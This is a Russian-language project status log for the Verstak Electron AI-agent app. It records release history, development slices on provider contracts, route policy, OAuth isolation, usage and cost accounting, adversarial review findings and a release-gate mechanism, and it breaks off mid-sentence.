# STATUS — Verstak

> Единый живой план работ. Открой — и сразу видно: что в проде, что осталось, что в бэклоге.
> **Обновляется в конце каждой рабочей сессии.** Не держи это в голове — держи здесь.

**Обновлено:** 2026-07-16 · **В проде:** **GitHub Release `v2.0.7` 🚀 ОПУБЛИКОВАН** (15.07; id=354432435; Setup 360,445,366 байт + Portable + latest.yml последним; провенанс собран из чистого git-коммита `baebe21d`, fromCleanWorktree; гейт 13/13 зелёный (sha512+размер latest.yml==Setup, type 0, test:fast 2707/0); публичный latest.yml отдаёт 2.0.7, Setup 200 OK size совпал → автообновление 2.0.6→2.0.7 пошло). **2.0.7 = ПРОГРАММА НАДЁЖНОСТИ провайдеров/моделей, ВСЕ 8 срезов A/B/C/D/E/F/G/H (каждый с адверсариальным ревью): единый Provider Contract (убраны 5 копий) + единый каталог в Settings (конец «мёртвых моделей») + Model Doctor/Grok-repair (устаревшая модель не уходит в backend, живой end-to-end) + модель-на-один-prompt (one-shot route + strict) + preload/tool/i18n/transport контракт-стражи (UI не обещает больше, чем движок умеет). Выложено через МЕХАНИЗМ (gate→build-из-git→publish→публичная проверка).** Предыдущий: **`v2.0.6`** (15.07; обнова Ильи — настройки проекта/просмотр файлов из чата + 3 критичных фикса).

> **🚧 ПРОГРАММА РЕЛИЗОВ 2.0.7–2.0.10 — живой журнал (старт 15.07).** План: `Downloads/Verstak-план-релизов-2.0.7-2.0.10.md` (прошёл конвейер Fable 5 → Codex → Grok → Antigravity → финальная сверка + факт-чек против репо). Оценка 27–38 сессий. **Правила программы:** один срез = один reviewable commit · сначала red-тест/characterization → реализация · allowlist файлов карточки ЖЁСТКИЙ (нужен файл вне списка → обновить карточку с причиной, стоп-условие 11) · P0-срезы (OAuth 2.0.8-C, Route Policy 2.0.8-D, Exact Rewind 2.0.9-E/F, provenance, contracts) → независимое адверсариальное ревью ДО merge, фиксы после ревью → ре-ревью · Exact Rewind (2.0.9-F) остаётся за feature-flag до зелёной fault-matrix + ручного Windows-smoke, в прод по умолчанию НЕ включать · чужие uncommitted-файлы (`smart-approve.ts`, `verstak-cli.mjs`, `verstak-cli-toolname.test.ts`, `audit_16_05/`) — не включать, не форматировать, не откатывать · релиз каждой версии — только через МЕХАНИЗМ (`release:gate` → `release:build` → `release:publish`).
>
> **📒 SUPPRESSION LEDGER (для аудита 2.0.10-G):** eslint-disable-деферралы (не фиксы) — поставлены как ДЕФЕРРАЛ, т.к. lint:changed линтит весь изменённый файл, а срез обязан был менять этот файл → pre-existing baseline-error всплыл; реальный фикс — за lint-cleanup/собственным срезом. Снять disable + пофиксить там:
> - `electron/main.ts` кандидат A (bootstrap floating-promise `app.whenReady().then()`) — `no-floating-promises`, D2 (`c10df70`). Реальный фикс: обработка ошибок bootstrap (не тривиальный void).
> - `electron/ai/claude.ts` (Anthropic SDK `stream()` await) — `await-thenable`, E commit 1 (`a75732d`).
> - `electron/ai/claude-cli.ts` + `codex-cli.ts` (permission-mode/sandbox `switch(mode)` без undefined-case) — `switch-exhaustiveness-check`, E commit 1 (`a75732d`). Реальный фикс: добавить недостающий case (default уже есть).
>
> **2.0.8 старт (15.07):** порядок backend-first — ветка Ильи (filatov) сейчас правит Settings.tsx/Chat.tsx/ProjectSettings.tsx/projectStore.ts, поэтому UI-срезы (2.0.8-A характеризация Settings, 2.0.8-G Профили, вшивка новых табов) отложены ДО merge Ильи, а backend-срезы идут вперёд: **B ✅ → C ✅(OAuth-изоляция, P0) → D-core ✅(Route Policy движок, P0) → D2(pinned enforcement, +main.ts) → E(usage/cache) → F(persistence)**. Закрыты **2.0.8-B**, **2.0.8-C**, **2.0.8-D-core**, **2.0.8-D2**, **2.0.8-E** (commit 1 `a75732d` адаптеры + commit 2 `0812625` потребители — дефект B денежный устранён), **2.0.8-F persistence-ядро** (`6ff9a5e` — миграция 50 `agent_run_usage` + идемпотентная запись usage/cost при finalize в обоих runner'ах, best-effort; P0 0 CRITICAL/HIGH) — см. таблицу. Следующий — **F read/UI-сторона** (IPC usage:list/summary + UsageTab standalone + cache-diagnostic detection), затем **gate 2.0.8** (без A/G — ждут merge Ильи; честная пометка в gate).
>
> **2.0.8-D разбит (решение координатора, утверждена моя рекомендация): D-core ✅ + D2.** Дизайн-хендофф — `scratchpad/2.0.8-D-design-handoff.md`. **D-core закрыт** (`a2ff611`): детерминированный движок `route-policy.ts` (7/8 инвариантов, спека, 54 теста) + структурное событие `route-changed` (оба runner'а + agent_run_events). **D2 (✅ ЗАКРЫТ `c10df70`, P0):** enforcement инварианта 1 (pinned-аккаунт не меняется авто) + инвариант удаления. **Red-first фундамент** (`c0e9acd`, приоритет координатора #3): чистый `resolveChatAccount(binding, accountExists)` → auto|pinned|**unavailable** + инвариант удаления (pinned на удалённый аккаунт → unavailable, БЕЗ тихой ротации), TDD red→green. **Остаток D2 (свежий заход, main.ts-хирургия + P0-ревью):** проводка в путь прогона (main.ts binding-aware резолв `resolveSubscriptionAccount(providerId, chatId)` + обработка unavailable = stop+ask в send-хендлере + **подавление авто-свитча/fallback для pinned-чата** — иначе полу-инвариант) + `decideRoute`-как-драйвер (нужна поверхность пула аккаунтов). Каветаты координатора: main.ts диф строго минимальный, кандидата A (floating-promise ~289) НЕ трогать; при драйвере перевалидировать 3 косметических кейса `classifyRouteReason` + тест-лок «руннер-бонды = единственный исполнительный источник» пережить драйвер. Всё это живёт в **`main.ts`/`chat-sessions.ts`** (allowlist D2 официально расширен координатором). Плюс для D2: перевалидировать 3 косметических edge-case `classifyRouteReason` (500-items→prov-unavail, «model of behavior does not exist», голое «Internal Server Error»→none) — когда классификатор станет драйвить маршрутизацию (сейчас кормит только ярлык события). UI-пилюля route-changed в TimelineBar (диспетчер в Chat.tsx) — пост-Ilya. **Анти-полой-фичи (координатор): pinned НЕ показывать рабочим до D2.**
>
> **Прогресс по срезам:**
>
> | Срез | Статус | Коммит | Факт |
> |---|---|---|---|
> | **2.0.7-A** baseline 2.0.6 | ✅ ЗАКРЫТ | (verify-only) | Цепочка доказана: тег `v2.0.6` → коммит `b57bdcc` → артефакт собран ИЗ ЭТОГО коммита из чистого git (`BUILD_PROVENANCE`). Публично: latest.yml=2.0.6, installer HTTP 200, size 360,468,565 == локальному, sha512 совпал. `type` 0 · `test:fast` **2591 passed / 0 failed** (== baseline плана). Чужой dirty worktree записан и не тронут. |
> | **2.0.7-B** Preload contract | ✅ ЗАКРЫТ | `a6fa5c7` | `tests/contracts/preload-api-contract.test.ts` (9): TS-AST парсит `contextBridge.exposeInMainWorld('api',…)` ↔ `interface Window{api}`, сверяет поверхности, ловит битые `on*`-отписки. Страж падает громко, если поверхность не найдена. Результат: **53 неймспейса / 267 методов** с обеих сторон, ноль дрейфа. `type` 0 · задетые зелёные. |
> | **2.0.7-C** Единый Provider Contract | ✅ ЗАКРЫТ | `737ebc6` | `shared/contracts/provider.ts` — один источник ID/transport/execMode/authKind/capabilities/DTO для main+renderer. Убраны ПЯТЬ копий (2 union + KNOWN_IDS + 2 DTO); реестр `Record<ProviderId,…>`; неизвестный сохранённый провайдер больше НЕ схлопывается молча в gemini (возвращает факт подмены). capabilities 7→8 (+perFileUndo). Honesty-поля исправлены (liveTimeline/authKind/secretKey/perFileUndo — не врут о поведении). Стражи от рецидива через автообнаружение (git ls-files + provider-позиции), авто-покрыли `runtime-capability.ts`. **P0: 2 раунда адверс. ре-ревью (9+1 агент), все находки (пятая копия DTO, 3 врущих коммента, 2 неполных стража) пофикшены, мутации подтвердили.** `type` 0 · `test:fast` **2642 passed / 0 failed**. |
> | **2.0.7-D** Единый каталог в Settings | ✅ ЗАКРЫТ | `39f1500` | Settings.tsx хардкодил массив PROVIDERS (~270 строк — ПОСЛЕДНЕЕ зеркало реестра с копией models[]; из-за него UI 2 мес предлагал мёртвые модели Claude). Убран: `useProviderCatalog` грузит каталог из providers:list (как композер), функционал из main-реестра, презентация из `PROVIDER_UI_META` (копия БЕЗ моделей). bundled-снапшот = офлайн-fallback с меткой источника. Молчаливая подмена сохранённой модели на mount УБРАНА → «⚠ модель недоступна» badge (шаг 5); `save()` не цементирует stale. drift-страж ПЕРЕЕХАЛ с Settings-хардкода на bundled↔реестр + РАСШИРЕН на transport/supportsTools. **Ревью нашло: врущий коммент (send резолвится в main) + РЕАЛЬНЫЙ дрейф yandex/gigachat supportsTools — пофикшено, мутация подтвердила.** Осознанно НЕ делал: экстракцию ProvidersTab/ModelsTab (→ декомпозиция Settings 2.0.8-A). Блок «stale не уходит в backend» → 2.0.7-E. `type` 0 · `test:fast` **2635 passed / 0 failed**. Визуальная приёмка Settings — за Павлом (Electron). |
> | **2.0.7-E** Model Doctor + Grok repair | ✅ ЗАКРЫТ | `a229b4a` | Блокер снят — реальный формат `grok models` захвачен САМ (Bash к `~/.grok/bin/grok.exe`) в ДВУХ состояниях (auth + unauth от координатора). `model-discovery.ts` parseGrokModels (переживает баннер «not authenticated» — unauth ВСЁ РАВНО отдаёт каталог; выдуманных error-строк НЕТ) + `model-catalog-service.ts` (кеш id+timestamp, TTL 24ч, гейт checkModelAvailable). Гейт блокирует запуск grok child-процесса на подтверждённо-отсутствующей модели (свежий+АУТЕНТИФИЦ.+НЕПУСТОЙ каталог) вместо молчаливой подмены на дефолт (шаг 7). IPC providers:doctor/refresh-models + гейт-провязка ai.ts→registry→grok-cli + UI-кнопка «🩺 Проверить модели». **ЖИВОЙ end-to-end на реальном бинаре: grok-build отсутствует → гейт БЛОКИРУЕТ (acceptance выполнен).** Ревью→FIX-FIRST: F1 (пустой auth-каталог самоблокировал всё на 24ч), F2 (auto), F4 (фантом из stderr) — пофикшено+тест. Стоп-условие 11: ai.ts/registry/Settings.tsx вне allowlist (гейт+UI). `type` 0 · `test:fast` **2679 passed / 0 failed**. UI-приёмка за Павлом. |
> | **2.0.7-F** Модель на один prompt | ✅ ЗАКРЫТ | `96125e8` | Выбор провайдер/модель на ОДНУ отправку (one-shot, не меняет дефолт чата), по умолчанию strict (при сбое НЕ переезжать молча на запасного). Backbone AiSendOverrides переиспользован; добавлено: контракт `PromptRouteOverride`+resolvePromptRoute, strict→smartFallback OFF, agent_runs `requested_*` (миграция 48) отдельно от actual (updateActual обновляет actual при fallback — не врёт), one-shot store (сброс после send + при switchChatSession), `PromptRouteControl.tsx`. Resume берёт сохранённый route из БД. **Ревью FIX-FIRST: C1 (CRITICAL — route был в budget-continue вместо главного send() → фича мертва) перепроведён; M1/M2/L1/F1 закрыты.** Тесты 10 (resolver/agent-runs/one-shot). `type` 0 · `test:fast` **2689/0** · build ✓. UI-приёмка PromptRouteControl за Павлом. |
> | **2.0.7-H** Transport parity | ✅ ЗАКРЫТ | `06f0fed` | `cli-parity-contract.test.ts` (18): матрица capabilities (CLI/Tunnel=урезанный контроль) ДОКАЗАННО совпадает с реальным runner-plain — по исходнику НЕ ссылается на lookupHandler/saveCheckpoint/attest/delegate/mcp/recordWrite (иначе false был бы ложью; мутация подтвердила). tool-таймлайн = проекция структурного event.call, не синтез из stdout. runtimeCapability чистая (switch не оставляет стейл-capability). stop→treeKill (дерево subprocess). Гэпов не найдено — матрица честна с 2.0.7-C, кода не меняли. DoD: UI не обещает больше, чем движок. `type` 0 · `test:fast` **2707/0**. |
> | **2.0.7-G** Tool + i18n контракты | ✅ ЗАКРЫТ | `3584c2e` | `lookupHandler` больше НЕ отдаёт generic read любому неизвестному имени (write-тул, выпавший из registry, молча понижался до parallel-read, обходя confirm). Теперь: registry → MCP → `GENERIC_READ_ALLOWLIST` (6 audited read) → иначе `unknownToolHandler` (отказ без исполнения). Контракт-стражи: `tool-contract.test.ts` (18 — каждый TOOL_DEF классифицирован, опасные держат mode, scheduler-набор whitelist parallel-read/read-гейт) + `i18n-parity.test.ts` (4 — рекурсивный паритет ru↔en). TS-AST парсит TOOL_DEFS/SCHEDULED из исходников. **Ревью→PUSH; 2 LOW пофикшено (мёртвый export снят, denylist→whitelist, преувеличение в коммете убрано); мутации подтвердили.** `type` 0 · `test:fast` **2658 passed / 0 failed** · ipc-suite 202. |
> | **2.0.8-F** Persistence usage (persistence-ядро, P0) | ✅ ЗАКРЫТ (push, не релиз) | `6ff9a5e` | **Каждый завершённый прогон пишет ОДНУ строку в `agent_run_usage` (миграция 50):** провайдер/модель/транспорт/токены (вход/выход/cache read+write)/inputAccounting/стоимость. История usage переживает рестарт. **Идемпотентность:** run_id PRIMARY KEY + INSERT OR IGNORE → повторный finalize / crash-resume-переигровка НЕ создают 2-ю строку (red double-persist первым). **Деньги:** стоимость через тот же price-слой, что cost-guard, `billableInputTokens` (фикс дефекта B: Claude=exclusive → НЕ вычитаем cached); неизвестная модель → cost=**null** (НЕ $0), pricing_known=0; CLI/локальные → $0 known (3 состояния UI). **Проводка best-effort:** `agentRuns.persistUsage` рядом с finish() в ОБОИХ runner'ах — сбой персистенса НЕ роняет прогон (try/catch, red-throw-тест на API+CLI). Строка = ACTUAL final provider (при fallback пишет терминальный фрейм под `!handedOff`; accounting↔providerId согласованы). **Хук проведён методом AgentRuns (agentRuns уже течёт в оба runner'а вкл. рекурсию fallback) — минимальнее AiDeps-callback + позиционного каскада runner-plain; координатору: allowlist фактически = runner-api+runner-plain+agent-runs.ts (storage-зона, НЕ AiDeps/main.ts).** cost-guard экспортировал PRICES/CLI_FREE/normalizeModelId read-only (единый price-слой). **P0: 2 адверс-ревьюера → 0 CRITICAL/HIGH.** `type` 0 · storage 9 + agent-loop 19 + plain-loop 10 + codex-isolation 14 + cost-guard 15 зелёные. **⚠️ Знаемый системный пробел (задокументирован, деферрал 2.0.10-G):** cacheWriteTokens ПЕРСИСТИТСЯ, но в стоимость НЕ входит — как и в live cost-guard (у Claude cache-creation ~1.25×input); держим ОДИНАКОВО с CAP, чтобы cost не разошёлся; тарификация = отдельный срез (ModelPrice.cacheWrite + оба места). **Осталось в F (read/UI-сторона, следующий заход):** IPC usage:list/summary + UsageTab (standalone, БЕЗ вшивки) + cache-diagnostic detection. |
> | **2.0.8-E commit 2** Потребители usage (P0, деньги) | ✅ ЗАКРЫТ (push, не релиз) | `0812625` | **Дефект B (денежный) устранён во ВСЕХ 5 cost-recording потребителях:** раньше `billable = max(0, input−cached)` для всех — верно для inclusive (OpenAI/Gemini/Codex-Responses), НЕВЕРНО для Claude (exclusive: input уже без кэша → повторное вычитание занижало/клампило в 0 на больших cache-hit). Теперь `billableInputTokens(usage)` — единое место. cost-guard.recordAndCheck сигнатура (input/output/cached: number\|null, inputAccounting?); каветат #4: usage целиком null → «нет данных» (не $0, не блок). runner-api ×2 / runner-plain / sub-agent-loop / **delegation.ts (decomposeGoal — ЗАБЫТЫЙ картой 5-й потребитель, найден адверс-ревью)** шлют inputAccounting. pricing +optional inputAccounting (default inclusive = прежнее). Red-first: defect-B тест (Claude exclusive input=1M cached=1M → 330c, было бы 30c) + null + характеризация inclusive (30c) не меняется. **⚠️ Павлу:** дневной cost-CAP считает Claude ЧЕСТНО → лимит срабатывает раньше (прекращение занижения, НЕ регрессия); per-chat pill в UI ($2/$5) пока занижен для Claude до Chat.tsx-проводки **пост-Ilya**. projectStore/session-journal не тронуты (только токены, не стоимость). **P0: 2 адверс-ревьюера → забытый delegation.ts пофикшен, ре-ревью CONFIRMED-FIXED→PUSH.** `type` 0 · 109 зелёные. **Follow-ups:** display Chat.tsx пост-Ilya; cacheWrite-биллинг (defect A); снятие deprecated-моста → 2.0.10-G. |
> | **2.0.8-E commit 1** Usage-контракт + адаптеры | ✅ ЗАКРЫТ (push, не релиз) | `a75732d` | Единый `NormalizedUsage` (`shared/contracts/usage.ts`): input/output/cacheRead/**cacheWrite** (number\|null — **null='не сообщил', НЕ 0**, каветат #1), `inputAccounting` (exclusive\|inclusive\|unknown), providerReportedInputTokens. **`billableInputTokens()` — единственное место вычитания cached, только при inclusive** (каветат #4). **Фикс дефекта B (денежный):** exclusive (Claude) НЕ вычитает cached (input_tokens уже без кэша) → billable больше не занижался/клампился в 0 на больших cache-hit; inclusive (OpenAI/Gemini/Codex-Responses) вычитает. Все 8 адаптеров на `normalizedUsage()` с ground-truth-семантикой; **claude-cli cache_creation больше НЕ теряется (фикс дефекта A)**. types.ts UsageDelta → совместимый суперсет (не ломает старые сайты). Fixtures-таблица (acceptance): double-count кэша невозможен. `type` 0 · usage-normalization 18 + провайдеры + харнесы 93 зелёные, ничего не сломано. 3 pre-existing baseline lint-error → eslint-disable-деферрал (ledger). **Остаток E commit 2 (свежий заход + P0-ревью, денежный код):** потребители (runner-api/plain, sub-agent-loop, session-journal, cost-guard, pricing, projectStore) — заменить `max(0, input−cached)` на `billableInputTokens(usage)` + читать cacheWrite/inputAccounting. Там дефект B вступает в силу. |
> | **2.0.8-D2** Pinned enforcement (P0) | ✅ ЗАКРЫТ (push, не релиз) | `c10df70` | Инвариант 1 (pinned-аккаунт не меняется авто) + инвариант удаления (карточка B). Проводка per-chat binding (2.0.8-B) в путь прогона: **main.ts** resolveSubscriptionAccount(providerId, chatId) стал binding-aware через чистый `pickChatAccountId` (auto\|pinned\|unavailable + сверка провайдера) — диф минимальный (2 импорта + closure), **кандидат A НЕ фиксился** (eslint-disable-деферрал: lint:changed линтит весь изменённый файл → legacy-error всплыл; реальный фикс — в его срезе; реверсивно). Send-хендлер: chat закреплён на **удалённый** аккаунт → **стоп-с-вопросом** (`return 0`, БЕЗ тихой ротации). pinned-чат → `fallbackOpts.pinnedAccount` → attemptAccountSwitch + attemptProviderFallback **подавлены в ОБОИХ runner'ах** (ротация/fallback увели бы с закреплённого аккаунта). 5 call-sites + resolveCodexHome пробрасывают chatId (`ResolvedSubscription` union). **P0: 3 адверс-ревьюера → Finding A HIGH (голый `return`→спиннер висел вечно; → `return 0`) пофикшен, ре-ревью CONFIRMED-FIXED→PUSH.** Red-first: pickChatAccountId (mismatch→auto, gone→unavailable) + pinned-суппресс (agent-loop+plain-loop). Характеризация цела, backward-compat C (13/13). `type` 0 · route-policy 63 + харнесы 28 зелёные. chat-sessions.ts не тронут. **Non-blocking follow-ups (в бэклог):** спец-текст unavailable в UI (Chat.tsx вне allowlist — рендерер на sendId≤0 показывает общий «провайдер недоступен»); codex-sibling pin-edge (openai-codex-oauth pinned на живой codex-cli аккаунт → suppression off; недостижимо до pinned-UI); over-block gone+смена-провайдера (нужен providerId в binding, миграция); decideRoute-как-драйвер + ai:send→0 return-contract тест → **D-хвост/E-F**. |
> | **2.0.8-D-core** Route Policy движок (P0) | ✅ ЗАКРЫТ (push, не релиз) | `a2ff611` | Детерминированный движок `route-policy.ts` (чистая `decideRoute`, DoD: один input state → одно решение; без Date.now/random/общего стейта → два параллельных чата независимы). Кодирует 7/8 инвариантов: strict/pinned не меняют маршрут (auth→refresh на том же аккаунте); chat-default quota → ротация готового аккаунта ДО model-fallback; quota/rate-limit/provider-unavailable/network/model-not-found — РАЗНЫЕ action + scoped cooldown (account/model/provider — не глушим бренд); attemptKey providerId:model:accountId без повторов + maxAttempts loop guard. `classifyRouteReason`+`routeChangedText` — ЖИВЫЕ (зовутся обоими runner'ами). **Структурное `route-changed`** (types.ts + api.d.ts зеркало): эмитится в handoff-точках (rotate-account/model-fallback) с reason+requested/actual/attempt → пишется в `agent_run_events` (kind='route', без миграции) — пользователь объясняет КАЖДУЮ смену (инв.8). Renderer-safe (без accountId/токена). **Loop guard — единый источник** (каветат координатора): руннер-бонды MAX_FALLBACK_ATTEMPTS/MAX_ACCOUNT_SWITCHES НЕ тронуты (исполнительный источник); движок-guard = спека, залочен тестом «единый бюджет» (импортирует руннер-константы). **P0: адверс-ревью через Workflow (16 агентов, 3 линзы+верификация) → движок/проводка/честность PASS; 6 находок classifyRouteReason/telemetry пофикшены (парс HTTP-статуса в контексте вместо голых чисел «retry after 401 seconds»→auth; 5xx целиком 504/529; 403+quota→quota; attempt-паритет API↔CLI; api.d.ts зеркало) → ре-ревью фиксов PUSH.** `type` 0 · route-policy 54 + agent-loop 18 + plain-loop 8 зелёные. Отложено ПО ПРИЧИНЕ: decideRoute-драйвер+pinned → D2 (+main.ts); TimelineBar-пилюля → пост-Ilya (диспетчер в Chat.tsx). |
> | **2.0.8-C** Изоляция Codex OAuth (P0) | ✅ ЗАКРЫТ (push, не релиз) | `f4c267d` | Наследие 2.0.4: `codexHome` резолвился ТОЛЬКО для `codex-cli` → нативный `openai-codex-oauth` loop всегда шёл в дефолтный `~/.codex/auth.json`, переключение Codex-аккаунтов на нём не действовало. Фикс: единый `resolveCodexHome` резолвит активный Codex-аккаунт для ОБОИХ провайдеров (оба логинятся одним `codex login`→`<CODEX_HOME>/auth.json` — **shared-модель**). Все ТРИ createProvider-сайта на едином резолвере (main send / fallback / **runScheduledHeadless** — находка ревью **F1 MEDIUM**: scheduled/NL-cron прогон на openai-codex-oauth шёл в дефолтный `~/.codex` ЧУЖОГО аккаунта — дыра изоляции). Изоляция без нового кода в credential-store/provider — они уже ключуют стейт по пути к auth.json (свой config-dir = свой стейт, cross-write невозможен); `process.env.CODEX_HOME` НЕ мутируется (глобал Electron). Предикат `isCodexAuthProvider` вынесен в registry.ts (иначе copy-страж provider-model-drift принял бы per-provider ветвление за копию реестра). Тест `codex-oauth-isolation.test.ts`: два CODEX_HOME раздельно + параллельный refresh без cross-write + single-flight на аккаунт + 401 без петли + токен не в событиях + **проводка codexHome во все 3 сайта (F3, ловит класс F1)**. docs с честными non-goals (отдельный OAuth-реестр, per-chat выбор, label-ошибка, login-required → 2.0.8-D). **P0: 2 адверс-ревьюера (изоляция/безопасность + архитектура/DoD) → F1+F2 пофикшены, ре-ревью фиксов CONFIRMED-FIXED.** `type` 0 · задетые+дрейф+петли+scheduler зелёные. UI создания OAuth-аккаунтов — после merge Ильи. |
> | **2.0.8-B** Контракт подписок | ✅ ЗАКРЫТ (push, не релиз) | `8182d22` | Единый renderer-safe контракт подписочных аккаунтов `shared/contracts/subscription.ts` (импортят main+renderer). **Безопасность (главное): прежний `subscription-accounts:list` делал `{ credRef, ...rest }` и МОЛЧА пропускал `configDir`/`baseUrl` в renderer.** Теперь строгий WHITELIST-сериализатор `toSubscriptionAccountDTO`: наружу уходят РОВНО id/providerId/label/authMode/state/active/cooldown/lastUsedAt/hasCredential — ни токена, ни credRef, ни OAuth-path, ни configDir, ни baseUrl. Acceptance-тест deep-JSON-сканом доказывает: ни одного значения секрета в выходе даже при заполненной main-модели. **Scoped cooldown** (миграция 49: cooldown_scope/reason/model, `markAccountCooling(detail)`, DTO.cooldown{scope,reason,until,model?}) — инфра под детерминированную маршрутизацию 2.0.8-D (наполнение reason из runner — работа D). **Per-chat binding** (chat_sessions.subscription_account_id/subscription_mode DEFAULT 'auto'; fork наследует; удаление аккаунта НЕ ротирует pinned молча) + IPC `chats:get/set-subscription-binding` с рантайм-валидатором `isChatSubscriptionBinding` (renderer не доверяем; устойчив к prototype-pollution). **Адверс. ревью → PUSH** (утечки нет, валидатор не обходится, миграция append-only+guarded); фикс INFO-3 (cooldown ⟺ state==='cooling') +2 теста. `type` 0 · `test:fast` зелёный / 0 failed. `SubscriptionsTab` + панель — standalone (в Settings.tsx вошьётся ПОСЛЕ merge ветки Ильи). Чужой uncommitted-WIP (smart-approve/verstak-cli/toolname) не тронут. |
>
> **🔒 МЕХАНИЗМ РЕЛИЗА (15.07) — публикацию решает МАШИНА, не человек.** Требование Павла: «нет компетенций / нет механизмов проверки / нет опыта — если не будет механизма, проект закрыт». Построено 4 команды: **`release:gate`** — 13 объективных проверок, ноль мнений (всё запушено · артефакт собран ИЗ ЭТОГО коммита и из чистой копии git · версия новее опубликованной · CHANGELOG её описывает · sha512+размер в latest.yml == реальному Setup.exe · типы 0 · тесты 0 падений). Зелёный → можно, красный → нельзя + печатает ПОЧЕМУ. **`release:build`** — сборка в чистом git-worktree: **незакоммиченный код физически не может попасть в .exe пользователей** (вскрытая дыра: `dist:win` собирал из рабочего дерева, и чужая правка `baseline-verify.ts` уехала в бинарь 2.0.6 при «всех зелёных»). **`release:publish`** — гоняет гейт (красный → публикации нет), заливает Setup→Portable→latest.yml ПОСЛЕДНИМ, проверяет ПУБЛИЧНЫЕ ссылки и при расхождении САМ снимает раздачу. **`release:stop`** — аварийный стоп. Гейт доказал работоспособность: **сначала заблокировал релиз** (нет паспорта сборки), потом пропустил. На боевом прогоне вскрылись и починены 3 дефекта самого механизма (анонимный rate-limit GitHub API, Windows-argv калечил тело релиза, SyntaxError). Предыдущий: **`v2.0.5`** (12.07; Setup.exe 360,453,606 байт + Portable + latest.yml, публичный `releases/latest`=v2.0.5 draft=false, latest.yml отдаёт 2.0.5, Setup 302→200 size совпадает, автообновление 2.0.4→2.0.5). **2.0.5 = UI-рефреш Ильи (редизайн Settings V3-connectors+иконки, GlobalTooltipHost, ProjectRulesView, темы) + дневной cost-cap с персистом (переживает рестарт) + фиксы Битрикс24/Wordstat; Codex OAuth + 3 режима из 2.0.4 сохранены.** Предыдущий: **GitHub Release `v2.0.4` ОПУБЛИКОВАН** (12.07; Setup.exe 360,421,001 байт + latest.yml, публичный download HTTP 200 + size совпадает, автообновление 2.0.0→2.0.4). **2.0.4 = Codex OAuth (наш agent-loop на подписке ChatGPT/Codex, direct-OAuth, live-валидирован, Experimental+opt-in) + 3-режимная таксономия (Туннель/CLI/API, Claude Code→Туннель) + багфиксы (пагинация Ozon/Bitrix, github/telegram/gsheets, token-cache по client_id, RU-морфология recall).** Предыдущие релизы v2.0.0/v1.9.9;  **GitHub Pages `frolofpavel.github.io/verstak` авто-резолвит свежий релиз → 1.9.9**; `agi-iri.ru/verstak` — зона Codex/dev-hq · **1.9.5 = бандл:** подписочный мультиаккаунт (Claude token + Codex CODEX_HOME, 1.9.3) + авто-переключение на лимите (1.9.4) + UI-пакет Ильи + **CLI-глубокая-интеграция (ночь 10.07): проекция tool-таймлайна Claude+Codex + честные runtime-ярлыки + Control Envelope git-якорь + permission-mode/guard секретов claude-cli** · **В main (не зарелизено): 1.9.6 Trust Hardening 5.5/7 + 1.9.7 Long Sessions (все 5 автономных) + 6 ревью-фиксов + 1.9.8: #4 resume-guard, #6 log-редакция, docs-truth §5, + распил ai.ts 6 срезов (progress/supplements/util/runner-shared/**переезд runPlainConversation −419**/**переезд runApiConversation −1486**), 3364→1250 (−2114, −63%) + 2 адверс-ревьюера (identity+семантика ЧИСТО) + cross-verify lock-in тест + #4 resume-guard аудит (материально готов+покрыт) + #6 redaction-тесты (вложенность/массивы/depth/split-token) + docs-truth (карта CLAUDE.md §2 под runner-*) + #3 projectStore leaveChat (устранён дубль snapshot-логики switch/new) + openHelpChat phantom-stream фикс (находка ревью) + test-изоляция, store 82/82 + **1.9.9 старт: «AI-дежурный» срезы 1-2 (хиро-пресеты Scheduler'а + мост «Починить в чате»)**** по плану Павла (`Downloads/Verstak-план-усиления-1.9.6-1.9.9.md`, 1.9.9-направление скорректировано продуктовым ревью — см. ниже) · **Тесты:** `npm run type` pass, `npm run test:fast` зелёные / 0 failed, `npm run build` ✓ · **Ветка:** main (`3932c4f`, тег `v1.9.5`) · **Распил ЯДРА завершён** — оба гиганта (runPlainConversation CLI-путь + runApiConversation API-путь ~1300, ЯДРО каждого send) вынесены в runner-plain.ts/runner-api.ts, circular-dep разорван через runner-shared.ts (pending-registry+turn-константы), AiDeps type-only. Каждый переезд верифицирован харнесом agent-loop(18)+plain-loop(8) — поведение идентично. ai.ts = IPC-shell. **Остаток распила:** registerAiIpc ~700 (можно дробить дальше, но уже не гигант-функция). **Остаток 1.9.8:** RuntimeAdapter (#2 — отложен, спекулятивно), #3 leave-часть ЗАКРЫТА (единый leaveChat, дубль устранён; async-enterChat осознанно НЕ трогал — уже на чистых restoreBundle/freshSnapshot, вынос side-eff части = риск>отдача), PTC live-валидация (#5 — на Павле)

> **Качество кода — Фаза 2, срез 6: OAuth fault harness (12.07, ✅ ВЛИТО в main после ТРЁХ раундов адверсариального ревью).** По §2.3. `tests/ai/codex-oauth/fault-harness.test.ts` (22 теста): single-flight refresh (в т.ч. МЕЖДУ чатами), атомарная ротация refresh_token, сбой записи auth-state, битый/неполный auth.json, реактивный 401-retry (bounded: endpoint дёргается РОВНО 2 раза — класс дефекта 1.9.7 `6b2f0b5`), transport-parity. Безопасность: реальный `~/.codex/auth.json` не открывается (temp-dir через codexHome), safeStorage не трогается, токены не печатаются. **ГЛАВНЫЙ УРОК: два моих фикса подряд сами содержали баги — поймано только злым ре-ревью.** (1) Первый фикс (`1f7277b`) ЗАЯВЛЯЛ «сессия живёт на токенах в памяти», но памяти не было (store пересоздаётся на каждый `ai:send`) → ход 2 падал с `invalid_grant`; фикс лишь ПОДМЕНЯЛ честную ошибку («нет места») обманчивой («ошибка авторизации»). (2) Переделка (`7d823b3`) внесла **HIGH**: при втором подряд сбое записи ориентир «что на диске» уезжал → код принимал нетронутый диск за re-login, выбрасывал живые токены → **лок-аут на 3-м ходу** (`R1→R2→R1` → `refresh_token_reused`). (3) Финал (`27b70fd`) закрыл 5 находок: `diskRefresh`-ориентир не двигается при повторных сбоях (верифицировано 5-ходовым прогоном `R1→R2→R3→R4→R5`, ноль повторов) · `codex logout` больше не игнорируется (память не подставляет токены старого аккаунта) · отравленный промис в single-flight (синхронный throw из fetch залипал навсегда) · уборка tmp-файла с ЖИВЫМ токеном (утечка секрета при сбое rename — теперь удаляется, а если не дают, затирается) · предупреждение доходит до **UI** (в упакованном .exe `console.warn` невидим — консоли нет). Проверки: type 0, lint 0 errors, test:fast **2591 passed / 0 failed**. **Честные хвосты (в бэклог, не блокеры):** 2 LOW-косметики (пустой tmp в редкой гонке; карантин антивируса на auth.json трактуется как logout) · **наследие 2.0.4:** OAuth-провайдер НЕ получает мультиаккаунтный `CODEX_HOME` (в `ai.ts` он резолвится только для `codex-cli`) → переключение Codex-аккаунтов на этот провайдер сейчас 